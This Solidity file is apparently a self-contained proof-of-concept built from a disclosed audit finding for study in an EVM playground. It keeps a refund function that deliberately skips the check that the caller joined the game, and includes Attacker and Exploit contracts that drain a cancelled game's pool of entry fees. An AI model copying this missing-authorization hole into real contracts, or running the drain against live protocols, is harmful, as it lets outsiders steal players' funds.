// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Majority Protocol — refundCancelledGame missing join check
    (Cyfrin / Dacian, 2026-01-27 majority-protocol-v2.0, #65373)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: SessionManager.refundCancelledGame only checks Cancelled
    state, then calls _refundEntryFee for msg.sender without verifying
    contestants[gameId][msg.sender]. Anyone can drain the ticket-price
    pool of a cancelled game.

    Vulnerable line preserved verbatim (@> VULN).
    Provenance: Engage-Protocol/engage-protocol @ cca0cb3 (pre-fix)
    Fixed: 7692203 (require contestants[_gameId][msg.sender]).
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    string public constant name = "USDC";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal SessionManager + DepositManager reduction.
contract SessionManager {
    enum SessionState {
        Created,
        Ongoing,
        Ended,
        Cancelled,
        Concluded
    }

    struct GamePool {
        uint256 gameId;
        uint256 ticketPrice;
        uint256 totalCollectedAmount;
        address token;
    }

    struct Game {
        SessionState state;
        address creator;
    }

    mapping(uint256 => Game) public games;
    mapping(uint256 => GamePool) public gamePools;
    mapping(uint256 => mapping(address => bool)) public contestants;
    mapping(uint256 => mapping(address => bool)) public hasRefunded;
    uint256 public nextGameId = 1;

    error NotJoined(address player, uint256 gameId);
    error AlreadyRefunded(address player, uint256 gameId);
    error NotEnoughFunds(address token, uint256 amount);
    error InvalidGameState(SessionState expected, SessionState actual);

    event RefundRequested(uint256 indexed gameId, address indexed player);
    event GameCancelled(uint256 indexed gameId);
    event ContestantJoined(uint256 indexed gameId, address indexed player);

    function createGame(uint256 ticketPrice, address token) external returns (uint256 gameId) {
        gameId = nextGameId++;
        games[gameId] = Game({state: SessionState.Created, creator: msg.sender});
        gamePools[gameId] = GamePool({
            gameId: gameId,
            ticketPrice: ticketPrice,
            totalCollectedAmount: 0,
            token: token
        });
    }

    function joinGame(uint256 _gameId) external {
        Game storage g = games[_gameId];
        require(g.state == SessionState.Created || g.state == SessionState.Ongoing, "bad state");
        require(!contestants[_gameId][msg.sender], "already joined");
        _payEntryFee(_gameId, msg.sender);
        contestants[_gameId][msg.sender] = true;
        emit ContestantJoined(_gameId, msg.sender);
    }

    function cancelGame(uint256 _gameId) external {
        require(games[_gameId].creator == msg.sender, "only creator");
        require(games[_gameId].state != SessionState.Cancelled, "cancelled");
        require(games[_gameId].state != SessionState.Concluded, "concluded");
        games[_gameId].state = SessionState.Cancelled;
        emit GameCancelled(_gameId);
    }

    /// @notice Refunds the entry fee to a participant for a cancelled session.
    /// @dev VULN: does not require contestants[_gameId][msg.sender].
    function refundCancelledGame(uint256 _gameId) external {
        require(games[_gameId].state == SessionState.Cancelled, "not cancelled");
        // FIX: require(contestants[_gameId][msg.sender], NotJoined(msg.sender, _gameId));
        _refundEntryFee(_gameId, msg.sender); // @> VULN: no join check — any address drains ticketPrice
        emit RefundRequested(_gameId, msg.sender);
    }

    function _payEntryFee(uint256 gameId, address player) internal {
        GamePool storage pool = gamePools[gameId];
        MockToken(pool.token).transferFrom(player, address(this), pool.ticketPrice);
        pool.totalCollectedAmount += pool.ticketPrice;
    }

    function _refundEntryFee(uint256 gameId, address player) internal {
        GamePool storage pool = gamePools[gameId];
        require(pool.totalCollectedAmount >= pool.ticketPrice, NotEnoughFunds(pool.token, pool.totalCollectedAmount));
        require(!hasRefunded[gameId][player], AlreadyRefunded(player, gameId));
        hasRefunded[gameId][player] = true;
        MockToken(pool.token).transfer(player, pool.ticketPrice);
        pool.totalCollectedAmount -= pool.ticketPrice;
    }

    function getSessionState(uint256 gameId) external view returns (SessionState) {
        return games[gameId].state;
    }
}

/// @dev Holds victim token balance so join can pull funds without cheatcodes.
contract Victim {
    MockToken public tok;
    SessionManager public sm;

    constructor(MockToken _tok, SessionManager _sm) {
        tok = _tok;
        sm = _sm;
    }

    function fundAndJoin(uint256 gameId, uint256 fee) external {
        tok.approve(address(sm), fee);
        sm.joinGame(gameId);
    }

    function tryRefund(uint256 gameId) external {
        sm.refundCancelledGame(gameId);
    }
}

/// @dev Attacker never joins; only calls refundCancelledGame.
contract Attacker {
    SessionManager public sm;

    constructor(SessionManager _sm) {
        sm = _sm;
    }

    function drain(uint256 gameId) external {
        sm.refundCancelledGame(gameId);
    }
}

contract Exploit {
    MockToken public tok; // CREATE nonce 1
    SessionManager public sm; // CREATE nonce 2
    Victim public victim; // CREATE nonce 3
    Attacker public attacker; // CREATE nonce 4

    uint256 public constant FEE = 10 ether;
    uint256 public constant GAME_ID = 1;

    constructor() {
        tok = new MockToken();
        sm = new SessionManager();
        victim = new Victim(tok, sm);
        attacker = new Attacker(sm);
    }

    function run() external {
        // Setup: creator creates game, victim joins with FEE.
        sm.createGame(FEE, address(tok));
        tok.mint(address(victim), FEE);
        victim.fundAndJoin(GAME_ID, FEE);
        require(tok.balanceOf(address(sm)) == FEE, "pool not funded");

        // Creator cancels.
        sm.cancelGame(GAME_ID);

        // Attacker who never joined drains the cancelled-game pool.
        attacker.drain(GAME_ID);

        // Harm: attacker holds all entry fees; legitimate player cannot refund.
        require(tok.balanceOf(address(attacker)) == FEE, "attacker did not drain");
        require(tok.balanceOf(address(sm)) == 0, "pool not empty");
        require(tok.balanceOf(address(victim)) == 0, "victim should be drained");

        // Victim refund reverts (NotEnoughFunds).
        try victim.tryRefund(GAME_ID) {
            revert("victim refund should fail");
        } catch {
            // expected
        }
    }
}
